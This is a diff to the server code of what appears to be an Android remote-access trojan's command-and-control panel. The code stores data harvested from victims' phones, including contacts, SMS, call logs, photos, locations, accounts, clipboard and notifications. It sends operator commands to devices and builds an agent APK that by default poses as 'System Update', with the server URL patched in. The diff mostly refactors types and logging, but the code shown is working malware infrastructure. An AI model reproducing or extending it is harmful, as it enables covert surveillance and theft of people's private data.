@@ -71,12 +71,13 @@ const DeviceSchema = new mongoose.Schema({
     executedAt: Date
   }],
   data: {
-    contacts: Array,
-    sms: Array,
-    callLogs: Array,
-    photos: Array,
-    videos: Array,
-    documents: Array,
+    contacts: [mongoose.Schema.Types.Mixed],
+    sms: [mongoose.Schema.Types.Mixed],
+    callLogs: [mongoose.Schema.Types.Mixed],
+    photos: [mongoose.Schema.Types.Mixed],
+    videos: [mongoose.Schema.Types.Mixed],
+    documents: [mongoose.Schema.Types.Mixed],
+    installedApps: [mongoose.Schema.Types.Mixed],
     locations: [{
       lat: Number,
       lng: Number,
@@ -84,14 +85,13 @@ const DeviceSchema = new mongoose.Schema({
       timestamp: Date,
       address: String
     }],
-    installedApps: Array,
-    accounts: Array,
+    accounts: [mongoose.Schema.Types.Mixed],
     clipboard: String,
-    notifications: Array,
-    wifiNetworks: Array,
-    deviceInfo: Object
+    notifications: [mongoose.Schema.Types.Mixed],
+    wifiNetworks: [mongoose.Schema.Types.Mixed],
+    deviceInfo: mongoose.Schema.Types.Mixed
   }
-}, { timestamps: true });
+}, { timestamps: true, strict: false });
 
 const Device = mongoose.model('Device', DeviceSchema);
 
@@ -217,29 +217,28 @@ io.on('connection', async (socket) => {
       socket.on('device:result', async (data) => {
         try {
           const { commandId, result, status } = data;
-          await Device.findOneAndUpdate(
-            { deviceId: socket.deviceId, 'commands.commandId': commandId },
-            { 
-              'commands.$.status': status || 'executed',
-              'commands.$.result': result,
-              'commands.$.executedAt': new Date()
-            }
-          );
-          io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result, status });
+          if (commandId) {
+            await Device.findOneAndUpdate(
+              { deviceId: socket.deviceId, 'commands.commandId': commandId },
+              { 
+                'commands.$.status': status || 'executed',
+                'commands.$.result': typeof result === 'object' ? JSON.parse(JSON.stringify(result)) : result,
+                'commands.$.executedAt': new Date()
+              }
+            );
+            io.emit(`command:result:${commandId}`, { deviceId: socket.deviceId, result, status });
+          }
         } catch (err) {
-          console.error('Result error:', err);
+          console.error('Result error:', err.message);
         }
       });
 
       socket.on('device:data:bulk', async (data) => {
         try {
-          const updateFields = {};
-          
           // Helper to extract array from wrapped objects like {"contacts": [...]}
           const extractArray = (val) => {
             if (Array.isArray(val)) return val;
             if (typeof val === 'object' && val !== null) {
-              // Check for wrapped format: {"contacts": [...]} or {"sms": [...]}
               const keys = Object.keys(val);
               if (keys.length === 1 && Array.isArray(val[keys[0]])) {
                 return val[keys[0]];
@@ -248,22 +247,20 @@ io.on('connection', async (socket) => {
             return val;
           };
           
+          const updateFields = {};
           if (data.contacts) updateFields['data.contacts'] = extractArray(data.contacts);
-          if (data.sms) {
-            const smsArray = extractArray(data.sms);
-            updateFields['data.sms'] = smsArray;
-          }
+          if (data.sms) updateFields['data.sms'] = extractArray(data.sms);
           if (data.callLogs) updateFields['data.callLogs'] = extractArray(data.callLogs);
           if (data.photos) updateFields['data.photos'] = extractArray(data.photos);
           if (data.videos) updateFields['data.videos'] = extractArray(data.videos);
           if (data.documents) updateFields['data.documents'] = extractArray(data.documents);
+          if (data.installedApps) updateFields['data.installedApps'] = extractArray(data.installedApps);
           if (data.location) {
             updateFields['$push'] = { 'data.locations': {
               ...data.location,
               timestamp: new Date()
             }};
           }
-          if (data.installedApps) updateFields['data.installedApps'] = extractArray(data.installedApps);
           if (data.deviceInfo) updateFields['data.deviceInfo'] = data.deviceInfo;
           if (data.battery) updateFields['data.battery'] = data.battery;
           if (data.simInfo) updateFields['data.simInfo'] = data.simInfo;
@@ -276,13 +273,15 @@ io.on('connection', async (socket) => {
             { new: true }
           );
           
+          console.log(`Data saved for ${socket.deviceId}:`, Object.keys(updateFields).join(', '));
           io.emit('device:data:update', { deviceId: socket.deviceId, data });
         } catch (err) {
-          console.error('Bulk data error:', err);
+          console.error('Bulk data error:', err.message);
         }
       });
 
       socket.on('disconnect', async () => {
+        console.log('Device disconnected:', socket.deviceId);
         await Device.findOneAndUpdate(
           { deviceId: socket.deviceId },
           { status: 'offline', lastSeen: new Date() }
@@ -374,7 +373,6 @@ app.post('/api/auth/register', async (req, res) => {
   try {
     const { username, password, email } = req.body;
     
-    // Check if username already exists
     const existingUser = await Admin.findOne({ username });
     if (existingUser) {
       return res.status(400).json({ error: 'Username already exists' });
@@ -439,7 +437,6 @@ app.post('/api/devices/:deviceId/command', authMiddleware, async (req, res) => {
 
 const APK_TEMPLATE_DIR = path.join(__dirname, '..', 'android-agent');
 
-// Generate build script for local APK building
 function generateBuildScript(build) {
   const androidAgentPath = path.resolve(__dirname, '..', 'android-agent');
   const appName = build.name || 'System Update';
@@ -489,7 +486,6 @@ fi
 STRINGS_FILE="app/src/main/res/values/strings.xml"
 if [ -f "\$STRINGS_FILE" ]; then
     echo -e "\${YELLOW}[*] Updating server URLs...\${NC}"
-    # Replace server_url in strings.xml
     if [[ "\$OSTYPE" == "darwin"* ]]; then
         sed -i '' 's|<string name="server_url".*</string>|<string name="server_url" translatable="false">${serverUrl}</string>|g' "\$STRINGS_FILE"
         sed -i '' 's|<string name="ws_url".*</string>|<string name="ws_url" translatable="false">${wsUrl}</string>|g' "\$STRINGS_FILE"
@@ -500,14 +496,11 @@ if [ -f "\$STRINGS_FILE" ]; then
     echo -e "\${GREEN}[✓] Server URLs updated\${NC}"
 fi
 
-# Make gradlew executable
 chmod +x gradlew
 
-# Clean and build
 echo -e "\${YELLOW}[*] Building APK (this may take a few minutes)...\${NC}"
 ./gradlew clean assembleDebug
 
-# Check if build succeeded
 APK_PATH="app/build/outputs/apk/debug/app-debug.apk"
 if [ -f "\$APK_PATH" ]; then
     echo ""
@@ -551,10 +544,8 @@ app.post('/api/apk/build', authMiddleware, async (req, res) => {
     });
     await build.save();
 
-    // Generate build script
     const buildScript = generateBuildScript(build);
     
-    // Save build script to server
     const buildDir = path.join(__dirname, 'builds', 'scripts');
     if (!fs.existsSync(buildDir)) {
       fs.mkdirSync(buildDir, { recursive: true });
@@ -585,7 +576,6 @@ app.get('/api/apk/builds', authMiddleware, async (req, res) => {
   }
 });
 
-// Build Status Check
 app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
   try {
     const build = await ApkBuild.findOne({ buildId: req.params.buildId });
@@ -606,7 +596,6 @@ app.get('/api/apk/status/:buildId', authMiddleware, async (req, res) => {
   }
 });
 
-// Download build script
 app.get('/api/apk/script/:buildId', authMiddleware, async (req, res) => {
   try {
     const build = await ApkBuild.findOne({ buildId: req.params.buildId });
@@ -615,7 +604,6 @@ app.get('/api/apk/script/:buildId', authMiddleware, async (req, res) => {
     const scriptPath = path.join(__dirname, 'builds', 'scripts', `build_${build.buildId}.sh`);
     
     if (!fs.existsSync(scriptPath)) {
-      // Regenerate script
       const buildScript = generateBuildScript(build);
       const buildDir = path.join(__dirname, 'builds', 'scripts');
       if (!fs.existsSync(buildDir)) {
